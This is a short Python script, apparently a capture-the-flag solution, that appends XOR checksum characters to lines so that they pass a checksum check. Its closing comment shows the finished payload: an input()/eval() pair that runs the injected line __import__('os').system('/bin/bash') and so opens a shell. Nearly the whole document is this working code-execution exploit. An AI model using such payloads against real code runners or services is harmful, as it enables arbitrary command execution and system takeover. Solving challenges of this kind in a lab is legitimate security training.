#!/usr/bin/env python3

lines = ["y=input()# ", "eval(y)#"]

def checksum(s):
    ret = 0
    for c in s:
        ret ^= ord(c)
    return ret

for line in lines:
    print(line + chr(checksum(line)))

'''
y=input()# 0
__import__('os').system('/bin/bash')
eval(y)#E
'''

